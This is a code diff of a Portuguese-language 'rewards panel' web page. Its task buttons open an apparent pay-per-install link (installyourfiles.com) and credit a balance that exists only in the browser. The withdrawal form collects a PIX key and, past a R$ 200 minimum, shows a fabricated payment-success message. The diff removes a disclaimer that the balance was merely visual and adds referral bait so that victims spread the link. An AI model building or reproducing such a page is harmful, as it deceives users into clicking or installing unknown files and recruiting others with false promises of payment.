@@ -5,104 +5,148 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Painel de Recompensas Pro</title>
     <style>
-        :root { --primary: #4e31aa; --bg: #0b0e14; --card: #16213e; --text: #ffffff; }
-        body { font-family: 'Segoe UI', sans-serif; background-color: var(--bg); color: var(--text); margin: 0; padding-bottom: 50px; }
+        :root { --primary: #4e31aa; --bg: #0b0e14; --card: #16213e; --text: #ffffff; --success: #00ff88; --danger: #ff4d4d; }
+        body { font-family: 'Segoe UI', sans-serif; background-color: var(--bg); color: var(--text); margin: 0; padding-bottom: 70px; }
         
-        /* Menu Lateral Estilizado */
-        .sidebar-header { border-left: 5px solid var(--primary); padding: 10px 20px; background: var(--card); display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
-        
+        /* Borda lateral no título conforme solicitado */
+        .sidebar-header { border-left: 6px solid var(--primary); padding: 10px 20px; background: var(--card); display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px; }
         .container { padding: 15px; }
         
-        /* Cartão de Saldo */
-        .balance-card { background: linear-gradient(135deg, #1a1a2e, #4e31aa); padding: 25px; border-radius: 20px; text-align: center; margin-bottom: 20px; box-shadow: 0 10px 20px rgba(0,0,0,0.4); }
-        .balance-card h2 { font-size: 2.5rem; margin: 10px 0; }
-        
-        /* Texto Explicativo */
-        .info-box { background: rgba(78, 49, 170, 0.1); border: 1px solid var(--primary); padding: 15px; border-radius: 10px; margin-bottom: 20px; font-size: 0.9rem; line-height: 1.4; }
+        .page { display: none; }
+        .page.active { display: block; }
 
-        /* Missões */
-        .mission-card { background: var(--card); padding: 15px; border-radius: 15px; margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center; border: 1px solid #252a34; }
-        .btn-go { background: var(--primary); color: white; border: none; padding: 10px 22px; border-radius: 8px; font-weight: bold; cursor: pointer; }
-
-        /* Anúncio Nativo */
-        .native-ad { background: #050505; border: 2px dashed #333; padding: 20px; border-radius: 15px; margin: 20px 0; text-align: center; color: #777; font-size: 0.8rem; }
+        .balance-card { background: linear-gradient(135deg, #1a1a2e, #4e31aa); padding: 25px; border-radius: 20px; text-align: center; margin-bottom: 20px; box-shadow: 0 10px 20px rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.1); }
+        .balance-card h2 { font-size: 2.8rem; margin: 10px 0; color: var(--text); }
         
-        /* Rodapé Menu */
-        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: var(--card); display: flex; justify-content: space-around; padding: 12px 0; border-top: 2px solid var(--primary); }
-        .nav-item { color: white; text-decoration: none; font-size: 0.8rem; opacity: 0.7; }
+        .mission-card { background: var(--card); padding: 15px; border-radius: 15px; margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center; border: 1px solid #252a34; transition: 0.3s; }
+        .btn-go { background: var(--primary); color: white; border: none; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 10px; font-size: 1rem; }
+        .btn-mission { width: auto; margin-top: 0; padding: 10px 20px; }
+
+        .input-group { text-align: left; margin-bottom: 15px; width: 100%; }
+        .input-group label { display: block; margin-bottom: 8px; font-size: 0.9rem; opacity: 0.8; }
+        .input-group input, .input-group select { width: 100%; padding: 14px; border-radius: 10px; border: 1px solid var(--primary); background: #0b0e14; color: white; box-sizing: border-box; outline: none; }
+
+        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: var(--card); display: flex; justify-content: space-around; padding: 15px 0; border-top: 2px solid var(--primary); z-index: 100; }
+        .nav-item { color: white; text-decoration: none; font-size: 0.85rem; opacity: 0.6; cursor: pointer; display: flex; flex-direction: column; align-items: center; transition: 0.3s; }
+        .nav-item.active { opacity: 1; color: var(--success); transform: translateY(-3px); }
+
+        .alert-box { background: rgba(255, 77, 77, 0.1); border: 1px solid var(--danger); color: var(--danger); padding: 10px; border-radius: 8px; font-size: 0.85rem; margin-top: 10px; display: none; }
     </style>
 </head>
 <body>
 
     <div class="sidebar-header">
-        <div><strong>Olá, <span id="userName">Membro</span></strong></div>
-        <div style="font-size: 0.8rem; color: #00ff88;">● Online</div>
+        <div><strong>PAINEL: <span id="userName">CARREGANDO...</span></strong></div>
+        <div style="font-size: 0.8rem; color: var(--success); font-weight: bold;">● CONECTADO</div>
     </div>
 
-    <div class="container">
-        <div class="balance-card">
-            <p style="opacity: 0.8; margin: 0;">Saldo Disponível</p>
-            <h2 id="saldo">R$ 0,00</h2>
-            <small>Mínimo para saque: R$ 50,00</small>
+    <div id="home" class="page active">
+        <div class="container">
+            <div class="balance-card">
+                <p style="opacity: 0.8; margin: 0; font-weight: bold; letter-spacing: 1px;">SALDO ATUAL</p>
+                <h2 class="display-saldo">R$ 0,00</h2>
+                <div style="background: rgba(0,0,0,0.3); padding: 5px 15px; border-radius: 50px; display: inline-block; font-size: 0.75rem;">
+                    SAQUE MÍNIMO: <strong>R$ 200,00</strong>
+                </div>
+            </div>
+            
+            <h3 style="border-left: 4px solid var(--primary); padding-left: 10px;">🔥 MISSÕES DO DIA</h3>
+            <div id="missoes-container"></div>
         </div>
+    </div>
 
-        <div class="info-box">
-            <strong>Como funciona?</strong><br>
-            Complete as tarefas abaixo para acumular pontos. O saldo é atualizado visualmente e liberado após a verificação da tarefa pelo anunciante.
-        </div>
-
-        <h3>🚀 Missões Disponíveis</h3>
-
-        <div id="missoes-container">
+    <div id="saque" class="page">
+        <div class="container">
+            <div class="balance-card" style="background: #111827;">
+                <p style="opacity: 0.8; margin: 0;">DISPONÍVEL PARA PIX</p>
+                <h2 class="display-saldo" style="color: var(--success);">R$ 0,00</h2>
             </div>
 
-        <div class="native-ad">
-            <p>PUBLICIDADE</p>
-            <div id="adsterra-native-1">CÓDIGO DO ANÚNCIO AQUI</div>
-        </div>
+            <div class="mission-card" style="flex-direction: column; align-items: flex-start;">
+                <h3 style="margin-top:0;">Solicitar Pagamento</h3>
+                
+                <div id="saqueError" class="alert-box" style="display:block;">
+                    ⚠️ Você ainda não atingiu o valor mínimo de <b>R$ 200,00</b>. Continue as missões para liberar o saque.
+                </div>
 
-        <h3>👥 Indicação</h3>
-        <div class="mission-card" style="background: #1a1a2e; border-color: #00ff88;">
-            <div><strong>Indique um Amigo</strong><br><small>Ganhe R$ 5,00 por novo usuário</small></div>
-            <button class="btn-go" style="background: #00ff88; color: black;" onclick="copyRefer()">COPIAR</button>
+                <div class="input-group" style="margin-top: 15px;">
+                    <label>Método de Recebimento</label>
+                    <select id="pixType">
+                        <option>PIX - CPF</option>
+                        <option>PIX - E-mail</option>
+                        <option>PIX - Telefone</option>
+                        <option>PIX - Chave Aleatória</option>
+                    </select>
+                </div>
+                <div class="input-group">
+                    <label>Chave de Destino</label>
+                    <input type="text" id="pixKey" placeholder="Insira sua chave PIX">
+                </div>
+                <button class="btn-go" id="btnWithdraw" onclick="requestWithdraw()">SOLICITAR PIX AGORA</button>
+            </div>
         </div>
     </div>
 
     <nav class="bottom-nav">
-        <a href="#" class="nav-item">🏠 Home</a>
-        <a href="#" class="nav-item" onclick="alert('Mínimo R$ 50,00')">💰 Saque</a>
-        <a href="#" class="nav-item" onclick="alert('Indique amigos e ganhe R$ 5,00')">🎁 Prêmios</a>
-        <a href="#" class="nav-item" onclick="alert('Suporte via Telegram')">🛠 Ajuda</a>
+        <div class="nav-item active" id="nav-home" onclick="showPage('home')">🏠<span>Início</span></div>
+        <div class="nav-item" id="nav-saque" onclick="showPage('saque')">💰<span>Sacar</span></div>
+        <div class="nav-item" onclick="copyRefer()">👥<span>Indicar</span></div>
     </nav>
 
     <script>
-        // Nome do Usuário
-        let user = prompt("Digite seu nome para acessar o painel:");
-        if(user) document.getElementById('userName').innerText = user;
-
         let currentBalance = 0;
+        const MIN_WITHDRAW = 200;
 
-        // Criar 5 Missões de teste
+        let nameInput = prompt("Bem-vindo! Digite seu nome de usuário:");
+        document.getElementById('userName').innerText = (nameInput || "USUÁRIO").toUpperCase();
+
+        function showPage(pageId) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById(pageId).classList.add('active');
+            
+            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+            document.getElementById('nav-' + pageId).classList.add('active');
+            
+            if(pageId === 'saque' && currentBalance >= MIN_WITHDRAW) {
+                document.getElementById('saqueError').style.display = 'none';
+            }
+        }
+
         const container = document.getElementById('missoes-container');
-        for(let i=1; i<=5; i++){
+        for(let i=1; i<=10; i++){
             container.innerHTML += `
                 <div class="mission-card">
-                    <div><strong>Missão 0${i}</strong><br><small>Recompensa: R$ 1,50</small></div>
-                    <button class="btn-go" onclick="doTask(1.50)">IR</button>
+                    <div><strong>Tarefa VIP 0${i}</strong><br><small>Bônus: R$ 5,00</small></div>
+                    <button class="btn-go btn-mission" onclick="doTask(5.00)">EXECUTAR</button>
                 </div>
             `;
         }
 
         function doTask(v) {
-            // Aqui você coloca o link de anúncio ou tarefa real
             window.open('https://installyourfiles.com/1879502', '_blank');
             currentBalance += v;
-            document.getElementById('saldo').innerText = 'R$ ' + currentBalance.toFixed(2).replace('.', ',');
+            updateDisplay();
+        }
+
+        function updateDisplay() {
+            document.querySelectorAll('.display-saldo').forEach(el => {
+                el.innerText = 'R$ ' + currentBalance.toFixed(2).replace('.', ',');
+            });
+        }
+
+        function requestWithdraw() {
+            if (currentBalance < MIN_WITHDRAW) {
+                alert("ACESSO NEGADO: Saldo insuficiente. O valor mínimo é R$ 200,00.");
+            } else {
+                let pix = document.getElementById('pixKey').value;
+                if(!pix) { alert("Por favor, insira sua chave PIX."); return; }
+                alert("✅ SUCESSO! Sua solicitação de R$ " + currentBalance.toFixed(2) + " foi enviada para análise. Prazo: 24h.");
+            }
         }
 
         function copyRefer() {
             navigator.clipboard.writeText(window.location.href);
-            alert("Link de indicação copiado!");
+            alert("🔗 Link copiado! Envie para amigos e ganhe R$ 10,00 após o primeiro saque deles.");
         }
     </script>
 </body>
